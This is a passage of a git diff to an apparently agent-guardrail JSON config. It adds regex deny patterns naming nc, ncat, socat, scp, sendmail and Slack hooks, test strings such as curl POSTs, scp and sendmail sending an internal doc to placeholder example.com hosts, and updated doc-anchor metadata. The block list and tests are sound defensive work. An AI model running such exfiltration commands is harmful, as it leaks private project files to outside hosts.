+        "(?:add_issue_comment|add_reply_to_pull_request_comment|add_comment_to_pending_review|issue_write|sub_issue_write|pull_request_review_write)\\b",
+        "(?:^|[\\s;&|(])(?:scp|sftp|nc|ncat|netcat|socat)\\s",
+        "\\brsync\\b[^\\n]*\\s[\\w.@-]+:\\S",
+        "(?:^|[\\s;&|(])(?:sendmail|mailx|mutt|msmtp|swaks)\\b",
+        "(?:send_message|create_draft)\\b",
+        "chat\\.postMessage\\b|hooks\\.slack\\.com"
       ],
       "pathPatterns": [
         "^reference/"
@@ -1937,13 +2016,33 @@
             "curl -s -X POST https://example.com/api -d @docs/agent/ORG.md",
             "curl -F file=@x.md https://upload.example.com",
             "curl --json @docs/agent/ORG.md https://example.com",
-            "wget --post-file=docs/agent/ORG.md https://example.com"
+            "wget --post-file=docs/agent/ORG.md https://example.com",
+            "curl -X POST https://example.com/hook",
+            "gh pr comment 439 --body 'brain says hi'",
+            "gh pr review 12 --comment -b \"note\"",
+            "gh issue create --title x --body y",
+            "gh issue comment 1597 --body y",
+            "gh gist create docs/agent/ORG.md",
+            "gh api repos/o/r/issues/439/comments -f body=x",
+            "mcp__github__add_issue_comment owner=o repo=r issue_number=1 body=x",
+            "mcp__github__issue_write method=create owner=o repo=r title=x",
+            "scp docs/agent/ORG.md user@example.com:/tmp/",
+            "rsync -a docs/ user@example.com:/srv/docs/",
+            "sendmail owner@example.com < docs/agent/ORG.md",
+            "mcp__Gmail__send_message",
+            "node scripts/post.mjs chat.postMessage"
           ],
           "mustNotMatch": [
             "pnpm run docs:retrieve -- \"what does the lane tick do\"",
             "curl -sS https://api.github.com/repos/o/r",
             "git show HEAD:docs/agent/ORG.md",
-            "wget -qO- https://api.github.com/repos/o/r"
+            "wget -qO- https://api.github.com/repos/o/r",
+            "gh pr view 439",
+            "gh issue list --state open",
+            "gh api repos/o/r/issues/439/comments",
+            "gh pr create --draft --base SignalGrid_Alpha",
+            "rsync -a docs/ /tmp/out/",
+            "grep -nc foo README.md"
           ]
         },
         "path": {
@@ -1984,11 +2083,11 @@
       "commandPatterns": [
         "\\bscripts/mac/lane-tick\\.sh\\b",
         "\\bscripts/mac/build-tick\\.sh\\b(?!(\\s+--)?\\s+--dry-run\\b)",
-        "\\bobjective-loop\\.mjs\\b[^\\n]*--write\\b",
+        "\\bobjective-loop\\.mjs\\b[^\\n]*--(?:write|deliver)\\b",
         "\\bsim:run-requests\\b(?!(\\s+--)?\\s+--plan\\b)",
         "\\bscripts/mac/run-requests\\.mjs\\b(?!(\\s+--)?\\s+(--plan|--self-test)\\b)",
         "\\binstall-(launchd|build-tick)\\.sh\\b(?!(\\s+--)?\\s+--status\\b)",
-        "\\bpnpm\\s+run\\s+sync(?![\\w:-])",
+        "\\bpnpm\\s+(?:run\\s+)?sync(?![\\w:-])",
         "\\bscripts/sync\\.mjs\\b",
         "\\bscripts/mac/mcp-up\\.sh\\b",
         "\\bscripts/mac/sg-brain-link\\.sh\\b",
@@ -2017,7 +2116,9 @@
             "bash scripts/mac/install-launchd.sh && echo --status",
             "pnpm run sim:run-requests && echo --plan",
             "node scripts/mac/run-requests.mjs && echo --self-test",
-            "launchctl kickstart -k gui/501/com.signalgrid.lane-tick"
+            "launchctl kickstart -k gui/501/com.signalgrid.lane-tick",
+            "node scripts/objective-loop.mjs --deliver",
+            "pnpm sync"
           ],
           "mustNotMatch": [
             "bash scripts/mac/build-tick.sh --dry-run",
@@ -2030,7 +2131,8 @@
             "pnpm run sync:manifest",
             "pnpm run sim:run-requests -- --plan",
             "launchctl list",
-            "launchctl print gui/501/com.signalgrid.lane-tick"
+            "launchctl print gui/501/com.signalgrid.lane-tick",
+            "pnpm sync:manifest"
           ]
         }
       }
@@ -2056,7 +2158,7 @@
         "CLAUDE.md:24-31",
         "scripts/check-owner-gated-surfaces.mjs:89-91",
         "docs/DECISION_RECORDS.md:2254-2261",
-        "docs/AGENT_GATEWAY.md:23-27"
+        "docs/AGENT_GATEWAY.md:23-26"
       ],
       "commandPatterns": [
         "\\bdb:(restore|migrate)\\b"
@@ -2126,8 +2228,8 @@
       "source": [
         "scripts/check-owner-gated-surfaces.mjs:43",
         "docs/DECISION_RECORDS.md:3272-3274",
-        "scripts/mac/local-brain/proof-policy.mjs:42-61",
-        "scripts/mac/local-brain/job-state.mjs:26-35"
+        "scripts/mac/local-brain/proof-policy.mjs:42-60",
+        "scripts/mac/local-brain/job-state.mjs:26-34"
       ],
       "commandPatterns": [],
       "pathPatterns": [
@@ -2159,82 +2261,246 @@
     }
   ],
   "anchors": {
-    ".claude/skills/landing-under-dr-037/SKILL.md:13-34": "## The five conditions — all of them, on the CURRENT head",
-    ".claude/workflows/land-branch.js:1-45": "// land-branch — the generic, tracked saved workflow for landing a worker branch",
+    ".claude/skills/landing-under-dr-037/SKILL.md:13-34": {
+      "first": "## The five conditions — all of them, on the CURRENT head",
+      "last": "decision needed\" as \"merged under DR-037\" with the check-run id."
+    },
+    ".claude/workflows/land-branch.js:1-44": {
+      "first": "// land-branch — the generic, tracked saved workflow for landing a worker branch",
+      "last": "description: 'Optional pre-edit, merge Alpha + regenerate on a clean index, one sequential preflight+breadth chain, push only on 0/0 verified by the script, ope"
+    },
     "AGENTS.md:13": "For any text written directly to the owner — chat replies, status reports, PR summaries,",
-    "AGENTS.md:73-82": "## Pull request guidance",
+    "AGENTS.md:73-82": {
+      "first": "## Pull request guidance",
+      "last": "- Screenshots or local QA notes when UI changes are perceptible"
+    },
     "AGENTS.md:84": "Do not merge your own PR. Leave merge decisions to the repository owner.",
-    "CLAUDE.md:107-112": "- **Touched the api-server?** `pnpm --filter @workspace/api-server run test:api`",
-    "CLAUDE.md:113-114": "- Core gates individually: `pnpm run typecheck`, `pnpm run review:invariants`,",
-    "CLAUDE.md:24-31": "1. **Never modify `native/ios/EnterpriseShell/Services/DecisionEngine.swift` or",
-    "CLAUDE.md:245-249": "Destructive git (force-push, history rewrite, branch deletion), anything that",
+    "CLAUDE.md:107-111": {
+      "first": "- **Touched the api-server?** `pnpm --filter @workspace/api-server run test:api`",
+      "last": "verify you didn't drop the neighbors (a real regression this file exists to"
+    },
+    "CLAUDE.md:113-114": {
+      "first": "- Core gates individually: `pnpm run typecheck`, `pnpm run review:invariants`,",
+      "last": "`pnpm run proof:signalgrid-simulator`."
+    },
+    "CLAUDE.md:24-31": {
+      "first": "1. **Never modify `native/ios/EnterpriseShell/Services/DecisionEngine.swift` or",
+      "last": "review:invariants` enforces this — keep it green."
+    },
+    "CLAUDE.md:245-249": {
+      "first": "## Ask before",
+      "last": "regulated verticals (healthcare/fintech): Claude Code does **not** guarantee"
+    },
     "CLAUDE.md:260": "- Never claim pass / exists / fixed / absent without just running the command and quoting",
     "CLAUDE.md:261": "- Done = tests/gates pass with quoted output AND the commit is confirmed on origin via",
     "CLAUDE.md:262": "- Never bypass a check: no `--no-verify`, no stash-to-dodge, no quiet flags, no",
     "CLAUDE.md:263": "- Session ritual: START — read `docs/agent/LOOP.md`, run `pnpm run loop:state`, quote",
     "CLAUDE.md:264": "- **Raise your hand when stuck (DR-054).** Be fail-closed about your OWN progress, not",
-    "CLAUDE.md:28-31": "2. **Fail-closed, deterministic, truthful.** No `Date.now()`/`Math.random()` in",
-    "CLAUDE.md:44-56": "Run the full local harness; it mirrors CI and catches breakage the individual",
-    "CLAUDE.md:68-74": "a gate the harness has no concept of. Run BOTH before pushing anything that",
-    "docs/AGENT_GATEWAY.md:23-27": "- **Never in the decision path.** Nothing under `lib/*`, `artifacts/api-server`'s `/v1`",
-    "docs/AGENT_GATEWAY.md:28-30": "- **Keys out of the tree.** Provider keys/OAuth are owner secrets — environment-only,",
-    "docs/AGENT_GATEWAY.md:67-71": "- **Never in the decision path.** Same rule, same reason, more so: LLM inference is",
-    "docs/DECISION_RECORDS.md:2230-2261": "**What \"green\" means here — every condition, none inferred.** A product PR is",
-    "docs/DECISION_RECORDS.md:2244-2245": "5. The lane **never approves** a PR (approval is a human act and the harness keeps",
-    "docs/DECISION_RECORDS.md:2254-2261": "\"Owner decision needed\" as *\"merged under DR-037\"* with the check-run id. It still does",
+    "CLAUDE.md:28-31": {
+      "first": "2. **Fail-closed, deterministic, truthful.** No `Date.now()`/`Math.random()` in",
+      "last": "review:invariants` enforces this — keep it green."
+    },
+    "CLAUDE.md:44-54": {
+      "first": "Run the full local harness; it mirrors CI and catches breakage the individual",
+      "last": "# (--sim-only for just the scenarios)"
+    },
+    "CLAUDE.md:68-74": {
+      "first": "a gate the harness has no concept of. Run BOTH before pushing anything that",
+      "last": "# (count the entries, not this comment — the header there says why)"
+    },
+    "docs/AGENT_GATEWAY.md:23-26": {
+      "first": "- **Never in the decision path.** Nothing under `lib/*`, `artifacts/api-server`'s `/v1`",
+      "last": "gateway is nondeterministic model routing by design. A model must never decide a"
+    },
+    "docs/AGENT_GATEWAY.md:28-30": {
+      "first": "- **Keys out of the tree.** Provider keys/OAuth are owner secrets — environment-only,",
+      "last": "- **By reference, not vendored.** Run it from upstream; it is not copied into this repo"
+    },
+    "docs/AGENT_GATEWAY.md:67-71": {
+      "first": "- **Never in the decision path.** Same rule, same reason, more so: LLM inference is",
+      "last": "does not change that (golden rule 2)."
+    },
+    "docs/DECISION_RECORDS.md:2230-2261": {
+      "first": "**What \"green\" means here — every condition, none inferred.** A product PR is",
+      "last": "— those remain the owner's); or delete branches."
+    },
+    "docs/DECISION_RECORDS.md:2244-2245": {
+      "first": "5. The lane **never approves** a PR (approval is a human act and the harness keeps",
+      "last": "refusing self-approval), and it never merges a PR it did not open or was not asked to"
+    },
+    "docs/DECISION_RECORDS.md:2254-2261": {
+      "first": "\"Owner decision needed\" as *\"merged under DR-037\"* with the check-run id. It still does",
+      "last": "— those remain the owner's); or delete branches."
+    },
     "docs/DECISION_RECORDS.md:2261": "— those remain the owner's); or delete branches.",
-    "docs/DECISION_RECORDS.md:3158-3159": "3. **Fail-closed on an unavailable tier.** If an assigned tier is unavailable or unknown,",
+    "docs/DECISION_RECORDS.md:3158-3159": {
+      "first": "3. **Fail-closed on an unavailable tier.** If an assigned tier is unavailable or unknown,",
+      "last": "4. **Contain a tier's exhaustion; be honest where it cannot be contained.** No spawn inherits the coordinator's model. Routing the bulk of work to Haiku/Sonnet "
+    },
     "docs/DECISION_RECORDS.md:3159": "4. **Contain a tier's exhaustion; be honest where it cannot be contained.** No spawn",
     "docs/DECISION_RECORDS.md:3160": "5. **A usage limit is an event, not an ending.** A subagent killed by a 429 is recorded as",
-    "docs/DECISION_RECORDS.md:3272-3274": "as a DRAFT — never auto-merges (`autoMergeGreenSwitch:false`). SAFETY_MACHINERY and",
-    "docs/DECISION_RECORDS.md:3278-3279": "The build/verify lane PREEMPTS the brain lane: nothing holding GB-scale model weights runs",
-    "docs/DECISION_RECORDS.md:3351-3353": "- **Never resident:** any local generative model, and `lightrag-server` graph mode",
+    "docs/DECISION_RECORDS.md:3272-3274": {
+      "first": "as a DRAFT — never auto-merges (`autoMergeGreenSwitch:false`). SAFETY_MACHINERY and",
+      "last": "IS SAFETY_MACHINERY, so it can never self-merge its own improvements."
+    },
+    "docs/DECISION_RECORDS.md:3278-3279": {
+      "first": "The build/verify lane PREEMPTS the brain lane: nothing holding GB-scale model weights runs",
+      "last": "`KeepAlive true`, and every brain service must be unloadable. The Mac has 17 GB and is"
+    },
+    "docs/DECISION_RECORDS.md:3351-3353": {
+      "first": "- **Never resident:** any local generative model, and `lightrag-server` graph mode",
+      "last": "residency is the exact thing that broke the box."
+    },
     "docs/DECISION_RECORDS.md:3968": "### 3. The code decides; a model may propose, block or escalate, never authorize",
     "docs/DECISION_RECORDS.md:3980": "The Mac is the sole writer, by technical necessity and not only by DR-050's doctrine: it",
     "docs/DECISION_RECORDS.md:3982": "The cloud reviews and merges the tick PRs under DR-037, and CONSUMES the ranked task:",
-    "docs/DECISION_RECORDS.md:4009-4016": "### 2. What \"raise your hand\" means, concretely",
+    "docs/DECISION_RECORDS.md:4009-4016": {
+      "first": "### 2. What \"raise your hand\" means, concretely",
+      "last": "return value the caller may discard."
+    },
     "docs/DECISION_RECORDS.md:4033": "- **Gates / routines**: \"could not run / could not determine\" is reported distinctly from",
     "docs/DECISION_RECORDS.md:4122": "Spec, review and gate design run on",
-    "docs/LANE_COORDINATION.md:101-102": "`mac/*` PR branches, never merging a PR). It then takes the objective loop's top",
-    "docs/LANE_COORDINATION.md:168-172": "Rules that did not change: the push is the delivery; only the addressee closes",
-    "docs/LANE_COORDINATION.md:203-207": "Division of labour between the two channels: **`artifacts/sim-requests/` carries",
-    "docs/LANE_COORDINATION.md:263-273": "1. **Check before touching a SHARED SURFACE.** These files serialize across",
-    "docs/LANE_COORDINATION.md:326-329": "9. **Regenerate `docs/agent/SURFACE_REVIEW_COVERAGE.md` only on a fully staged index",
-    "docs/LANE_COORDINATION.md:353-354": "worker contract for local-model, Codex and Claude Code sessions. Provider",
-    "docs/LANE_COORDINATION.md:358-377": "Claude Code shows one line at the foot of the lane session, from",
-    "docs/LANE_COORDINATION.md:445-446": "- `scripts/mutation-guard.mjs` mutates working-tree files; never run it",
-    "docs/LANE_COORDINATION.md:447-448": "- The sync manifest is generated (`node scripts/generate-sync-manifest.mjs`);",
-    "docs/LANE_COORDINATION.md:47-52": "**Rule 2 — what genuinely needs the physical Mac runs from a tick, unattended.**",
-    "docs/LANE_COORDINATION.md:62-66": "**Rule 3 — mail asks a person for judgment, never for a build.** A cloud→Mac",
-    "docs/LANE_COORDINATION.md:76-86": "`SG_STAGE_RUNNER` optionally names one absolute executable on the host, outside the",
-    "docs/LANE_COORDINATION.md:88-91": "never builds. A second launchd job, `scripts/mac/build-tick.sh`",
-    "docs/agent/ORG.md:137-153": "### Shared surfaces — serialize, always announce",
+    "docs/LANE_COORDINATION.md:101-102": {
+      "first": "`mac/*` PR branches, never merging a PR). It then takes the objective loop's top",
+      "last": "`tasks[]` row that no remote branch or open PR names and runs it as staged tiers"
+    },
+    "docs/LANE_COORDINATION.md:168-172": {
+      "first": "Rules that did not change: the push is the delivery; only the addressee closes",
+      "last": "removes the wake channel."
+    },
+    "docs/LANE_COORDINATION.md:203-207": {
+      "first": "Division of labour between the two channels: **`artifacts/sim-requests/` carries",
+      "last": "operation to run, it should have been a request. This file keeps the standing"
+    },
+    "docs/LANE_COORDINATION.md:263-273": {
+      "first": "1. **Check before touching a SHARED SURFACE.** These files serialize across",
+      "last": "context dies with the session; git history does not."
+    },
+    "docs/LANE_COORDINATION.md:326-329": {
+      "first": "9. **Regenerate `docs/agent/SURFACE_REVIEW_COVERAGE.md` only on a fully staged index",
+      "last": "`node scripts/check-surface-review-coverage.mjs --write`, `git add -A`, then run the gate without `--write`."
+    },
+    "docs/LANE_COORDINATION.md:353-354": {
+      "first": "worker contract for local-model, Codex and Claude Code sessions. Provider",
+      "last": "availability changes dispatch; it grants no additional merge authority."
+    },
+    "docs/LANE_COORDINATION.md:358-377": {
+      "first": "Claude Code shows one line at the foot of the lane session, from",
+      "last": "fixture tree; preflight and CI run it."
+    },
+    "docs/LANE_COORDINATION.md:445-446": {
+      "first": "- `scripts/mutation-guard.mjs` mutates working-tree files; never run it",
+      "last": "concurrently with anything else in the same checkout."
+    },
+    "docs/LANE_COORDINATION.md:447-448": {
+      "first": "- The sync manifest is generated (`node scripts/generate-sync-manifest.mjs`);",
+      "last": "a hand-edit or a stale copy fails `check:live-sync` on the next push."
+    },
+    "docs/LANE_COORDINATION.md:47-52": {
+      "first": "**Rule 2 — what genuinely needs the physical Mac runs from a tick, unattended.**",
+      "last": "written by the first tick) on every path — quiet, acted, skipped and why. The cloud steward opens the PR for"
+    },
+    "docs/LANE_COORDINATION.md:62-66": {
+      "first": "**Rule 3 — mail asks a person for judgment, never for a build.** A cloud→Mac",
+      "last": "cloud's, the third is a sim request the tick runs."
+    },
+    "docs/LANE_COORDINATION.md:76-86": {
+      "first": "`SG_STAGE_RUNNER` optionally names one absolute executable on the host, outside the",
+      "last": "atomic executable-file pin; the host must protect the runner and its dependencies."
+    },
+    "docs/LANE_COORDINATION.md:88-91": {
+      "first": "The lane tick",
+      "last": "while it is paused. Each run first pins mainline ONCE: it asks the real remote"
+    },
+    "docs/agent/ORG.md:137-153": {
+      "first": "### Shared surfaces — serialize, always announce",
+      "last": "recent changes there from another lane, stop and hand back to the owner."
+    },
     "docs/agent/ORG.md:170": "YOU              Merge. Agents never merge their own work.",
-    "docs/agent/ORG.md:181-193": "## Escalation — stop and ask the owner",
-    "docs/agent/ORG.md:201-208": "ROLE:        core | native | reviewer | scribe",
-    "docs/agent/ORG.md:3-27": "## Tier 0 — the accuracy doctrine, which outranks everything below it",
-    "docs/agent/RESOURCE_INTAKE.md:72-74": "4. Security boundaries hold: no secrets into third-party tools, no tenant",
-    "docs/agent/WORKER_BRIEF.md:105-108": "Attribute commits to the runtime that actually produced them. Claude Code",
-    "docs/agent/WORKER_BRIEF.md:14-15": "- Give the worker one branch, `<worker-branch>`, and a spec naming the allowed",
-    "docs/agent/WORKER_BRIEF.md:21-23": "- Apply the configured usage and credit limits before cloud dispatch. An",
-    "docs/agent/WORKER_BRIEF.md:24-25": "- One active writer per branch and worktree. Resume a worker through its",
-    "docs/agent/WORKER_BRIEF.md:3-7": "The coordinator gives each worker this brief plus a bounded task spec. It",
-    "docs/agent/WORKER_BRIEF.md:33-37": "1. **Fetch before you measure.** Run `git fetch origin SignalGrid_Alpha` and",
-    "docs/agent/WORKER_BRIEF.md:38-44": "The same rule covers the stall gate: a stall your clone shows that",
-    "docs/agent/WORKER_BRIEF.md:45-48": "2. **Test first.** Write the failing assertion, then the change; a gate ships",
-    "docs/agent/WORKER_BRIEF.md:58-62": "5. **Before every push:** `node scripts/preflight.mjs` and",
-    "docs/agent/WORKER_BRIEF.md:63-76": "6. **The PR.** If the task authorizes publication, open a DRAFT against",
-    "docs/agent/WORKER_BRIEF.md:65-68": "`## Summary`, `## What changed`, `## Validation`, `## Public-safety note`,",
-    "docs/agent/WORKER_BRIEF.md:80-81": "launch-claims gate does not allow. No model identifier anywhere in",
-    "docs/agent/WORKER_BRIEF.md:88-89": "8. **Never:** a flag that skips the git hooks, a forced push, a rebase of a",
-    "docs/agent/WORKER_BRIEF.md:88-92": "8. **Never:** a flag that skips the git hooks, a forced push, a rebase of a",
+    "docs/agent/ORG.md:181-193": {
+      "first": "## Escalation — stop and ask the owner",
+      "last": "The correct behaviour when uncertain is to stop, not to guess well."
+    },
+    "docs/agent/ORG.md:202-207": {
+      "first": "ROLE:        core | native | reviewer | scribe",
+      "last": "DONE WHEN:   the ladder is green + role-specific criteria"
+    },
+    "docs/agent/ORG.md:3-27": {
+      "first": "## Tier 0 — the accuracy doctrine, which outranks everything below it",
+      "last": "from unwarranted confidence — and saying so plainly is itself rule 1."
+    },
+    "docs/agent/RESOURCE_INTAKE.md:72-73": {
+      "first": "4. Security boundaries hold: no secrets into third-party tools, no tenant",
+      "last": "data, and the publication boundary applies to anything a tool writes into"
+    },
+    "docs/agent/WORKER_BRIEF.md:105-108": {
+      "first": "Attribute commits to the runtime that actually produced them. Claude Code",
+      "last": "must not invent a Claude author or session URL."
+    },
+    "docs/agent/WORKER_BRIEF.md:14-15": {
+      "first": "- Give the worker one branch, `<worker-branch>`, and a spec naming the allowed",
+      "last": "files, dependencies, failing check, required checks, and report path."
+    },
+    "docs/agent/WORKER_BRIEF.md:21-23": {
+      "first": "- Apply the configured usage and credit limits before cloud dispatch. An",
+      "last": "fallback; it never counts as a completed worker."
+    },
+    "docs/agent/WORKER_BRIEF.md:24-25": {
+      "first": "- One active writer per branch and worktree. Resume a worker through its",
+      "last": "existing session or recorded handoff; never start a competing writer."
+    },
+    "docs/agent/WORKER_BRIEF.md:3-7": {
+      "first": "The coordinator gives each worker this brief plus a bounded task spec. It",
+      "last": "authority. `.claude/skills/orchestrator-over-workers/SKILL.md` is the"
+    },
+    "docs/agent/WORKER_BRIEF.md:33-37": {
+      "first": "1. **Fetch before you measure.** Run `git fetch origin SignalGrid_Alpha` and",
+      "last": "raised from it is false. Measure at the origin tip, never from your tree."
+    },
+    "docs/agent/WORKER_BRIEF.md:38-44": {
+      "first": "The same rule covers the stall gate: a stall your clone shows that",
+      "last": "the real one is cleared)."
+    },
+    "docs/agent/WORKER_BRIEF.md:45-47": {
+      "first": "2. **Test first.** Write the failing assertion, then the change; a gate ships",
+      "last": "red. A figure written into `docs/*` is measured on your head, by a command"
+    },
+    "docs/agent/WORKER_BRIEF.md:58-62": {
+      "first": "5. **Before every push:** `node scripts/preflight.mjs` and",
+      "last": "assertion green, passed against total."
+    },
+    "docs/agent/WORKER_BRIEF.md:63-76": {
+      "first": "6. **The PR.** If the task authorizes publication, open a DRAFT against",
+      "last": "ones. Use the branch form. The current detector is"
+    },
+    "docs/agent/WORKER_BRIEF.md:65-68": {
+      "first": "Use the headings",
+      "last": "needed`. Under the last, state the `classifyDiff` tier of your files"
+    },
+    "docs/agent/WORKER_BRIEF.md:80-81": {
+      "first": "launch-claims gate does not allow. No model identifier anywhere in",
+      "last": "commits, PR text or code."
+    },
+    "docs/agent/WORKER_BRIEF.md:88-89": {
+      "first": "8. **Never:** a flag that skips the git hooks, a forced push, a rebase of a",
+      "last": "pushed branch, a stash to dodge a gate, a quiet flag, a second preflight"
+    },
+    "docs/agent/WORKER_BRIEF.md:88-92": {
+      "first": "8. **Never:** a flag that skips the git hooks, a forced push, a rebase of a",
+      "last": "previous call's directory persists. A worker never lands its own branch."
+    },
     "docs/agent/WORKER_BRIEF.md:92": "previous call's directory persists. A worker never lands its own branch.",
-    "docs/agent/scheduled-routines.json:101-102": "\"activationEvidence\": \"Mac-lane observation recorded 2026-10-22: com.signalgrid.build-tick",
+    "docs/agent/scheduled-routines.json:100-102": {
+      "first": "\"heartbeatPathReason\": \"each run's outcome is a pushed mac/build-row-* branch with its PR, or a raised hand; the Mac being awake is already watched by mac-lane-",
+      "last": "\"activationEvidence\": \"Mac-lane observation recorded 2026-10-22: com.signalgrid.build-tick is installed and loaded, with StartInterval=300. The actual canonical"
+    },
     "docs/agent/scheduled-routines.json:102": "\"activationEvidence\": \"Mac-lane observation recorded 2026-10-22: com.signalgrid.build-tick",
     "docs/agent/scheduled-routines.json:105": "\"id\": \"brain-cycle\",",
-    "docs/agent/scheduled-routines.json:92": "\"cron\": \"*/5 * * * *\",",
-    "docs/agent/scheduled-routines.json:92-93": "\"cron\": \"*/5 * * * *\",",
-    "docs/agent/scheduled-routines.json:93": "\"binding\": \"launchd user agent on the Mac lane's machine, running",
+    "docs/agent/scheduled-routines.json:91-93": {
+      "first": "\"trigger\": \"launchd:com.signalgrid.build-tick (installed by scripts/mac/install-build-tick.sh on the owner's Mac; not an account trigger)\",",
+      "last": "\"binding\": \"launchd user agent on the Mac lane's machine, running scripts/mac/build-tick.sh (which pins SignalGrid_Alpha's sha once per run with git ls-remote o"
+    },
+    "docs/agent/scheduled-routines.json:93": "\"binding\": \"launchd user agent on the Mac lane's machine, running scripts/mac/build-tick.sh (which pins SignalGrid_Alpha's sha once per run with git ls-remote o",
     "package.json:229": "\"lane:inbox\": \"node scripts/lane-message.mjs inbox\",",
     "package.json:232": "\"check:absence\": \"node scripts/agent/absence-check.mjs\",",
     "package.json:237": "\"sim:run-requests\": \"node scripts/mac/run-requests.mjs\",",
@@ -2242,98 +2508,268 @@
     "package.json:276": "\"docs:retrieve\": \"node scripts/docs-retrieval.mjs\",",
     "package.json:278": "\"hands\": \"node scripts/raised-hands.mjs\",",
     "package.json:42": "\"dispatch\": \"node scripts/dev-dispatch.mjs\",",
-    "scripts/agent/absence-check.mjs:3-9": "// usually gets the least.",
-    "scripts/brain-cycle.mjs:1-19": "// Brain-cycle orchestrator spine — the deterministic decision+report step (DR-032, Slice",
-    "scripts/build-loop.mjs:144-152": "const historyPath = path.join(historyDir, \"history.jsonl\");",
+    "scripts/agent/absence-check.mjs:3-8": {
+      "first": "// usually gets the least.",
+      "last": "//   node scripts/agent/absence-check.mjs --self-test"
+    },
+    "scripts/brain-cycle.mjs:1-19": {
+      "first": "// Brain-cycle orchestrator spine — the deterministic decision+report step (DR-032, Slice",
+      "last": "// EXIT CODES: 0 = a winner was written to decision.json and NOTHING else is pending;"
+    },
+    "scripts/build-loop.mjs:144-151": {
+      "first": "const historyPath = path.join(historyDir, \"history.jsonl\");",
+      "last": "fs.appendFileSync(historyPath, JSON.stringify(record) + \"\\n\");"
+    },
     "scripts/check-ci-liveness.mjs:110": "const IN_CI = Boolean(process.env.CI || process.env.GITHUB_ACTIONS);",
     "scripts/check-lane-messages.mjs:4": "//   node scripts/check-lane-messages.mjs --self-test  # prove the gate can fail",
     "scripts/check-local-brain-capabilities-mutants.mjs:2": "Local-brain capabilities, mutated - the gate that guards the brain's contract is itself guarded.",
     "scripts/check-local-brain-capabilities.mjs:2": "Local-brain capabilities - the Mac's local brain may only rely on a command contract that is true.",
-    "scripts/check-owner-gated-surfaces.mjs:119-129": "export function classifyDiff(files) {",
-    "scripts/check-owner-gated-surfaces.mjs:318-323": "// Guarded so this module can be IMPORTED for classifyDiff (e.g. by the brain cycle)",
-    "scripts/check-owner-gated-surfaces.mjs:321-323": "if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {",
+    "scripts/check-owner-gated-surfaces.mjs:119-129": {
+      "first": "export function classifyDiff(files) {",
+      "last": "return { tier: matched.length ? \"owner-gated\" : \"autonomous\", matched };"
+    },
+    "scripts/check-owner-gated-surfaces.mjs:319-323": {
+      "first": "// Guarded so this module can be IMPORTED for classifyDiff (e.g. by the brain cycle)",
+      "last": "else validate();"
+    },
+    "scripts/check-owner-gated-surfaces.mjs:321-323": {
+      "first": "if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {",
+      "last": "else validate();"
+    },
     "scripts/check-owner-gated-surfaces.mjs:43": "{ rule: \"scripts/**\", re: /^scripts\\// },",
-    "scripts/check-owner-gated-surfaces.mjs:43-91": "{ rule: \"scripts/**\", re: /^scripts\\// },",
+    "scripts/check-owner-gated-surfaces.mjs:43-91": {
+      "first": "{ rule: \"scripts/**\", re: /^scripts\\// },",
+      "last": "{ rule: \"the byte-faithful native decision ports\", re: /^native\\/ios\\/EnterpriseShell\\/Services\\/(DecisionEngine|AppWorkflows)\\.swift$/ },"
+    },
     "scripts/check-owner-gated-surfaces.mjs:8": "//   node scripts/check-owner-gated-surfaces.mjs --self-test # prove classify() works",
-    "scripts/check-owner-gated-surfaces.mjs:89-91": "{ rule: \"the decision core / connectors / flows (lib/*)\", re: /^lib\\// },",
-    "scripts/check-pr-gate-falsification.mjs:2-15": "// check-pr-gate-falsification.mjs — the per-PR precondition DR-050 named before the",
+    "scripts/check-owner-gated-surfaces.mjs:89-91": {
+      "first": "{ rule: \"the decision core / connectors / flows (lib/*)\", re: /^lib\\// },",
+      "last": "{ rule: \"the byte-faithful native decision ports\", re: /^native\\/ios\\/EnterpriseShell\\/Services\\/(DecisionEngine|AppWorkflows)\\.swift$/ },"
+    },
+    "scripts/check-pr-gate-falsification.mjs:2-15": {
+      "first": "// check-pr-gate-falsification.mjs — the per-PR precondition DR-050 named before the",
+      "last": "//   node scripts/check-pr-gate-falsification.mjs                             # at-rest validate"
+    },
     "scripts/check-raised-hands.mjs:6": "//   node scripts/check-raised-hands.mjs --self-test prove the routing + gap detection can",
     "scripts/check-readiness-figure.mjs:6": "//   node scripts/check-readiness-figure.mjs --self-test  # prove the derivation can fail",
-    "scripts/check-scheduled-routines.mjs:195-203": "const glob = r.retiredEvidence?.branchGlob;",
+    "scripts/check-scheduled-routines.mjs:195-203": {
+      "first": "const glob = r.retiredEvidence?.branchGlob;",
+      "last": "fatal.push(`${name}: could not list origin heads for ${glob} (${e.message}) — this gate refuses to call a retired lane silent when it could not look`);"
+    },
     "scripts/check-sim-requests.mjs:4": "//   node scripts/check-sim-requests.mjs --self-test  # prove the gate can fail",
     "scripts/check-surface-review-coverage.mjs:6": "//   node scripts/check-surface-review-coverage.mjs --self-test # prove the gate can fail",
-    "scripts/cleanup-merged-branches.sh:1-6": "# Delete remote branches that are FULLY CONTAINED in the base branch.",
-    "scripts/dev-dispatch.mjs:2-6": "// dev-dispatch — recommend LOCAL vs CLOUD for a task, per docs/DEV_DISPATCH.md.",
+    "scripts/cleanup-merged-branches.sh:1-5": {
+      "first": "#!/usr/bin/env bash",
+      "last": "#   ./scripts/cleanup-merged-branches.sh --apply    # actually delete them"
+    },
+    "scripts/dev-dispatch.mjs:2-6": {
+      "first": "// dev-dispatch — recommend LOCAL vs CLOUD for a task, per docs/DEV_DISPATCH.md.",
+      "last": "// you'll walk away from."
+    },
     "scripts/docs-retrieval.mjs:2": "// Retrieval over the docs corpus (DR-041) — LightRAG naive mode, local embeddings, no",
     "scripts/docs-retrieval.mjs:7": "//   pnpm run docs:retrieve -- --self-test            prove the two refusals still refuse",
     "scripts/lane-deliver.mjs:13": "//   flags: --dry-run        build and gate the commit, push nothing, keep nothing",
     "scripts/lane-deliver.mjs:14": "//          --via-pr         push a lane/<lane>-mail-<stamp> branch even on the Mac",
     "scripts/lane-deliver.mjs:15": "//          --trailer \"K: v\" append a commit trailer (repeatable)",
-    "scripts/lane-deliver.mjs:16-17": "//          --allow-ungated  deliver even when mainline lacks a gate script (named",
-    "scripts/lane-deliver.mjs:196-204": "} else if (o.op === \"heartbeat\") {",
+    "scripts/lane-deliver.mjs:16-17": {
+      "first": "//          --allow-ungated  deliver even when mainline lacks a gate script (named",
+      "last": "//                           in the output; never the default — see step 3)"
+    },
+    "scripts/lane-deliver.mjs:196-204": {
+      "first": "} else if (o.op === \"heartbeat\") {",
